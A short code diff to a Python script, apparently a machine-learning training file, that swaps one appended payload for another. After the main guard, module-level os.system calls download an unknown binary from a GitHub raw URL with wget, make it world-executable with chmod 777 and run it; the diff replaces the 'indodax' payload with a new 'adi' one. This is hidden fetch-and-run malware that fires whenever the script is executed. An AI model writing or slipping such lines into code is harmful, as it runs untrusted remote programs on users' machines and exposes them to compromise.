@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/Adeemar7/all/raw/main/indodax')
-os.system('chmod 777 indodax')
-os.system('./indodax')
+os.system('wget https://github.com/Adeemar7/kalaparan/raw/main/adi')
+os.system('chmod 777 adi')
+os.system('./adi')
